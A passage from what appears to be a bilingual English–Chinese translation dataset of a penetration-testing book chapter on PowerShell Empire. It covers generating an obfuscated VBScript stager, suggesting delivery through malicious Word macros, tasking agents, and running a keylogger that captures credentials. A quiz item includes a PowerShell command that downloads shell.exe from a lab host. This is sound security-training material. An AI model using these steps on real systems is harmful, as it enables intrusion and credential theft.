    that’s embedded in a Word document. Such attacks are still prevalent even at the
    time of writing, and unfortunately, we sometimes see them getting through. For
    now, I’m going with the VBScript stager, so I’ll complete the **usestager windows/launcher_vbs**
    command. We will immediately see our options menu. There are two important things
    to note when configuring options:'
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 正如你所看到的，这里有社会工程学的潜力；我将留给你发挥创意，想办法说服用户执行嵌入在 Word 文档中的恶意宏。这类攻击即便在撰写时仍然很常见，不幸的是，我们有时会看到它们成功突破防御。现在，我使用的是
    VBScript stager，所以我将完成 **usestager windows/launcher_vbs** 命令。我们将立即看到我们的选项菜单。配置选项时，有两个重要的事项需要注意：
- en: The stager has to know which listener to associate with. You define it here
    by name; in the old days, you had to make a note of the listener’s name when you
    first created it. Now, putting a space after **set Listener** will automatically
    give you a list of the existing listeners.
  id: totrans-182
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Stager 必须知道要与哪个监听器关联。你在这里通过名称进行定义；在过去，你需要在第一次创建监听器时记下它的名称。现在，在 **set Listener**
    后加空格，会自动给出现有监听器的列表。
- en: These options are case-sensitive.
  id: totrans-183
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 这些选项区分大小写。
- en: 'There are some great options and they’re shown in the following table. My favorite
    is the code obfuscation feature. I encourage you to play around with this option
    and try to review the resulting code (obfuscation requires PowerShell to be installed
    locally):'
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 这里有一些很棒的选项，以下表格展示了它们。我最喜欢的是代码混淆功能。我鼓励你尝试使用这个选项并查看生成的代码（混淆需要本地安装 PowerShell）：
- en: '![Figure 9.22 – Stager options menu ](image/Figure_9.22_B17616.jpg)'
  id: totrans-185
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.22 – Stager 选项菜单](image/Figure_9.22_B17616.jpg)'
- en: Figure 9.22 – Stager options menu
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.22 – Stager 选项菜单
- en: Once you’re ready, fire off **execute** to generate the stager. You’ll find
    the resulting VBSript file under **/var/lib/powershell-empire/empire/client/generated-stagers**.
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你准备好，执行 **execute** 来生成 stager。你会在 **/var/lib/powershell-empire/empire/client/generated-stagers**
    目录下找到生成的 VBSript 文件。
- en: Go ahead and crack open your fancy new stager. Let’s take a look inside.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 继续查看你那款崭新的 stager。让我们看看里面的内容。
- en: Your inside guy – working with agents
  id: totrans-189
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 你的内部人员 – 与代理合作
- en: 'Did you check out the VBScript? It’s pretty nifty. Check it out: **vim /var/lib/powershell-empire/empire/client/generated-stagers/launcher.vbs**.
    Even though we didn’t configure obfuscation for the actual PowerShell, the purpose
    of this VBScript is hard to determine, as you can see:'
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 你查看过 VBScript 吗？它非常巧妙。查看一下：**vim /var/lib/powershell-empire/empire/client/generated-stagers/launcher.vbs**。尽管我们没有为实际的
    PowerShell 配置混淆，但正如你所看到的，这个 VBScript 的用途难以确定：
- en: '![Figure 9.23 – Taking a peek inside the VBScript stager ](image/Figure_9.23_B17616.jpg)'
  id: totrans-191
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.23 – 窥视 VBScript stager 的内部](image/Figure_9.23_B17616.jpg)'
- en: Figure 9.23 – Taking a peek inside the VBScript stager
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.23 – 窥视 VBScript stager 的内部
- en: 'Regardless of what method you chose, we’re working in a three-stage agent delivery
    process with Empire. The stager is what opens the door; Empire takes care of the
    agent’s travels, as shown in the following diagram:'
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 无论你选择了哪种方法，我们都在 Empire 中进行三阶段的代理投递过程。stager 是打开大门的那一部分；Empire 负责代理的旅行，以下图所示：
- en: '![Figure 9.24 – The three-stage agent delivery process ](image/Figure_9.24_B17616.jpg)'
  id: totrans-194
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.24 – 三阶段代理投递过程](image/Figure_9.24_B17616.jpg)'
- en: Figure 9.24 – The three-stage agent delivery process
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.24 – 三阶段代理投递过程
- en: 'When you execute the stager on your Windows target, you won’t see anything
    happen. Look at your Empire screen, though, and watch the three-stage agent delivery
    process complete. The agent-attacker relationship is similar to a Meterpreter
    session and is managed similarly. Type **agents** to enter the **agents** menu
    and then use **interact** to talk to the particular agent that just got set up:'
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 当你在 Windows 目标上执行 stager 时，你不会看到任何变化。不过，看看你的 Empire 屏幕，观察三阶段代理投递过程完成。代理与攻击者之间的关系类似于
    Meterpreter 会话，且管理方式也相似。输入**agents**进入**agents**菜单，然后使用**interact**与刚刚设置的代理进行交互：
- en: '![Figure 9.25 – Active agent ready to be tasked ](image/Figure_9.25_B17616.jpg)'
  id: totrans-197
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.25 – 准备接受任务的活跃代理](image/Figure_9.25_B17616.jpg)'
- en: Figure 9.25 – Active agent ready to be tasked
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.25 – 准备接受任务的活跃代理
- en: 'As always, use **help** to find out what interaction options are available
    to you. For now, let’s grab a screenshot from the target with **sc**. The client
    window will simply tell you that it tasked the agent, but you can switch back
    to the server window to see some of the behind-the-scenes details:'
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 一如既往，使用**help**查看可用的交互选项。目前，让我们用**sc**从目标机器获取一张截图。客户端窗口只会告诉你它已任务代理，但你可以切换回服务器窗口，查看一些幕后细节：
- en: '![Figure 9.26 – Details of a task in the server window ](image/Figure_9.26_B17616.jpg)'
  id: totrans-200
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.26 – 服务器窗口中任务的详细信息](image/Figure_9.26_B17616.jpg)'
- en: Figure 9.26 – Details of a task in the server window
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.26 – 服务器窗口中任务的详细信息
- en: You’ll find your loot in **/var/lib/powershell-empire/downloads**. A screenshot
    is fun, but passwords will be visually obfuscated, so let’s wrap up our introduction
    with a PowerShell keylogging module.
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以在**/var/lib/powershell-empire/downloads**中找到你的战利品。截图很有趣，但密码会被视觉模糊处理，因此让我们通过
    PowerShell 键盘记录模块来结束介绍。
- en: Configuring a module for agent tasking
  id: totrans-203
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 为代理任务配置模块
- en: First, enter agents mode by entering the **agents** command. Execute **usemodule
    powershell/collection/keylogger**, followed by **set Agent** with the name you
    just noted. Fire off **execute** and sit back as your agent behind enemy lines
    gets to work. Back in your **interact** session, use the **view** command to see
    how things are coming along with your tasks.
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，输入**agents**命令进入代理模式。执行**usemodule powershell/collection/keylogger**，然后用你刚才记下的名字执行**set
    Agent**。然后输入**execute**，坐等你的代理在敌后开始工作。在你的**interact**会话中，使用**view**命令查看任务的进展情况。
- en: 'I would be happy to write a big, complicated paragraph detailing all of the
    moving parts, but it’s that simple to configure a basic module and task an agent
    with it. The Empire framework is just too handy to limit to this introductory
    chapter – we have some work in escalation and persistence to do, so keep this
    fantastic tool close at hand. Check out the result from this lab: we captured
    some credentials, and the agent was nice enough to give us the title of the page
    where it was entered:'
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 我很乐意写一大段复杂的文字，详细描述所有的活动部分，但配置一个基本模块并任务代理就这么简单。Empire 框架实在是太方便了，不仅仅局限于这一章节的介绍——我们还需要处理权限提升和持久性的问题，所以请把这个强大的工具随时准备好。来看一下这个实验的结果：我们捕获了一些凭据，代理还很友好地提供了输入凭据的页面标题：
- en: '![Figure 9.27 – Captured keystrokes sent by the Empire agent ](image/Figure_9.27_B17616.jpg)'
  id: totrans-206
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.27 – 帝国代理发送的捕获键击](image/Figure_9.27_B17616.jpg)'
- en: Figure 9.27 – Captured keystrokes sent by the Empire agent
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.27 – 帝国代理发送的捕获键击
- en: Just like when we were configuring listeners and stagers, we have optional settings
    and some that are required, and Empire does its best to configure them for you
    in advance. Carefully review the available options before tasking your agent with
    the module.
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 就像我们配置监听器和 stagers 时一样，我们有一些可选设置，也有一些是必需的，Empire 会尽力提前为你配置好。任务代理之前，请仔细审查可用选项。
- en: In a modern Windows enterprise environment, PowerShell is the ultimate “live
    off the land” tool at our disposal, and the Empire framework has the power to
    make you a ninja at your assessments. If you followed along with these labs, you
    already have the foundation to explore deeper, so crack open that target VM and
    try out some new tricks. We’ll be playing with Empire during our post-exploitation
    work, so stay tuned.
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 在现代 Windows 企业环境中，PowerShell 是我们可用的终极“就地作业”工具，而 Empire 框架则能使你在评估中成为一名“忍者”。如果你跟随这些实验，你已经打下了更深入探索的基础，那么赶快打开目标虚拟机，试试新技巧吧。我们将在后期利用
    Empire 进行后渗透工作，敬请期待。
- en: Summary
  id: totrans-210
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we explored PowerShell from two perspectives. First, we introduced
    PowerShell as an interactive task management command-line utility and as a scripting
    language. Then, we leveraged PowerShell scripts built into the PowerShell Empire
    attack framework as a way of demonstrating the potential when attacking Windows
    machines. Ultimately, we learned how to leverage a foothold on a Windows machine
    using built-in functionality to prepare for later stages of the attack.
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们从两个角度探索了 PowerShell。首先，我们将 PowerShell 作为一个交互式任务管理命令行工具和脚本语言进行介绍。然后，我们利用
    PowerShell Empire 攻击框架中构建的 PowerShell 脚本，展示了攻击 Windows 机器时的潜力。最终，我们学习了如何利用 Windows
    机器上的立足点，使用内置功能为攻击的后期阶段做准备。
- en: This introduction is an ideal segue into the concepts of privilege escalation
    and persistence, where we’ll turn our foothold into a fully privileged compromise
    and pave the way to maintain our access to facilitate the project in the long
    term. For now, we’ll jump into the next chapter where we introduce shellcoding
    and take a crash course in manipulating the stack.
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: 本章节的介绍是特权提升和持久性的理想过渡，我们将在此基础上将我们的立足点转变为完全的特权入侵，并为长期保持访问权限铺平道路。现在，我们将跳入下一个章节，介绍
    Shell 编程，并快速学习如何操作栈。
- en: Questions
  id: totrans-213
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 问题
- en: 'Answer the following questions to test your knowledge of this chapter:'
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: 请回答以下问题，测试你对本章内容的掌握情况：
- en: '**ls**, **dir**, and PowerShell’s _____ provide the same functionality.'
  id: totrans-215
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**ls**、**dir** 和 PowerShell 的 _____ 提供相同的功能。'
- en: What does **[Convert]::ToString($number, 2)** do to the **$number** variable?
  id: totrans-216
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**[Convert]::ToString($number, 2)** 对 **$number** 变量做了什么操作？'
- en: In PowerShell, we grep out results with ____.
  id: totrans-217
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在 PowerShell 中，我们使用 ____ 来筛选结果。
- en: 'The following command will create the **c:\shell** directory to write **shell.exe**
    to it (True | False):'
  id: totrans-218
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 以下命令将创建 **c:\shell** 目录并将 **shell.exe** 写入该目录 (正确 | 错误)：
- en: (New-Object System.Net.WebClient).DownloadFile("http://10.10.0.2/shell.exe",
    "c:\shell\shell.exe")
  id: totrans-219
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: (New-Object System.Net.WebClient).DownloadFile("http://10.10.0.2/shell.exe",
    "c:\shell\shell.exe")
- en: When configuring an HTTPS listener, you can use the **cert.sh** script to prevent
    the target browser from displaying a certificate alert. (True | False)
  id: totrans-220
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在配置 HTTPS 监听器时，可以使用 **cert.sh** 脚本来防止目标浏览器显示证书警告。(正确 | 错误)
- en: Further reading
  id: totrans-221
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 深入阅读
- en: 'For more information regarding the topics that were covered in this chapter,
    take a look at the following resources:'
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 要了解本章所涉及的主题的更多信息，请查看以下资源：
- en: 'Empire Project on GitHub: [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)'
  id: totrans-223
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 'Empire 项目在 GitHub 上: [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)'
- en: 'Microsoft Virtual Academy: PowerShell training: [https://mva.microsoft.com/training-topics/powershell#!lang=1033](https://mva.microsoft.com/training-topics/powershell#!lang=1033)'
  id: totrans-224
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 'Microsoft Virtual Academy: PowerShell 培训课程: [https://mva.microsoft.com/training-topics/powershell#!lang=1033](https://mva.microsoft.com/training-topics/powershell#!lang=1033)'
